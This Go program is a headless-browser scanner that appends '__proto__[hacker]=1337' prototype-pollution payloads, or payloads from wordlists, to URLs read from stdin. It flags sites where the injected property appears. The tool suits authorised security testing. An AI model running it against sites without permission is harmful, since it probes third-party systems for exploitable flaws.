package main

import (
    "bufio"
    "context"
    "flag"
    "fmt"
    "log"
    "os"
    "sync"
    "time"

    "github.com/chromedp/chromedp"
)

const (
    defaultJS   = `window.hacker || window[1337] ? "Vulnerable" : "Not Vulnerable"`
    numWorkers  = 10
    timeout     = 120 * time.Second
    maxRetries  = 5
)

func main() {
    var mode, userJS string
    flag.StringVar(&mode, "m", "search", "mode: search, hash, brute, gadget")
    flag.StringVar(&userJS, "j", defaultJS, "JavaScript to run on all pages")
    flag.Parse()

    sc := bufio.NewScanner(os.Stdin)
    urls := make(chan string, numWorkers)
    var wg sync.WaitGroup
    var mu sync.Mutex

    results := make(map[string]bool)
    var resultsFile *os.File
    var err error

    if resultsFile, err = os.OpenFile("results.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err != nil {
        log.Fatalf("Failed to open results file: %v", err)
    }
    defer resultsFile.Close()

    writer := bufio.NewWriter(resultsFile)
    defer writer.Flush()

    for i := 0; i < numWorkers; i++ {
        wg.Add(1)

        go func() {
            defer wg.Done()

            for u := range urls {
                attempt := 0
                var res string
                var err error

                for attempt < maxRetries {
                    attempt++
                    ctx, cancel := context.WithTimeout(context.Background(), timeout)
                    defer cancel()

                    ctx, cancel = chromedp.NewContext(ctx)
                    defer cancel()

                    err = chromedp.Run(ctx,
                        chromedp.Navigate(u),
                        chromedp.Evaluate(userJS, &res),
                    )

                    if err == nil {
                        break
                    }

                    if ctx.Err() != context.Canceled {
                        log.Printf("Error on %s (attempt %d/%d): %s", u, attempt, maxRetries, err)
                    }

                    time.Sleep(2 * time.Second)
                }

                if err != nil {
                    log.Printf("Failed to process %s after %d attempts: %s", u, maxRetries, err)
                    continue
                }

                mu.Lock()
                if res == "Vulnerable" {
                    fmt.Printf("%s %s%s%s\n", u, colorRed, res, colorReset)
                    if !results[u] {
                        writer.WriteString(fmt.Sprintf("%s\n", u))
                        results[u] = true
                    }
                } else {
                    fmt.Printf("%s %s%s%s\n", u, colorGreen, res, colorReset)
                }
                mu.Unlock()
            }
        }()
    }

    payloads := []string{}
    if mode == "brute" || mode == "gadget" {
        var payloadFile *os.File
        var fileName string
        if mode == "brute" {
            fileName = "payloads.txt"
        } else {
            fileName = "gadgets.txt"
        }

        if payloadFile, err = os.Open(fileName); err != nil {
            log.Fatalf("Failed to open %s: %v", fileName, err)
        }
        defer payloadFile.Close()

        scanner := bufio.NewScanner(payloadFile)
        for scanner.Scan() {
            payloads = append(payloads, scanner.Text())
        }
        if err = scanner.Err(); err != nil {
            log.Fatalf("Failed to read %s: %v", fileName, err)
        }
    }

    batchSize := 1000
    urlBatch := []string{}

    for sc.Scan() {
        u := sc.Text()
        urlBatch = append(urlBatch, u)
        if len(urlBatch) >= batchSize {
            processBatch(urlBatch, urls, mode, payloads)
            urlBatch = []string{}
        }
    }
    if len(urlBatch) > 0 {
        processBatch(urlBatch, urls, mode, payloads)
    }
    close(urls)
    wg.Wait()
}

func processBatch(urlBatch []string, urls chan string, mode string, payloads []string) {
    for _, u := range urlBatch {
        switch mode {
        case "search":
            urls <- u + "?__proto__[hacker]=1337"
        case "hash":
            urls <- u + "#__proto__[hacker]=1337"
        case "brute", "gadget":
            for _, payload := range payloads {
                urls <- u + "?" + payload
                urls <- u + "#" + payload
            }
        default:
            log.Fatalf("Invalid mode: %s. Use 'search', 'hash', 'brute', or 'gadget'.", mode)
        }
    }
}

const (
    colorRed   = "\033[31m"
    colorGreen = "\033[32m"
    colorReset = "\033[0m"
)

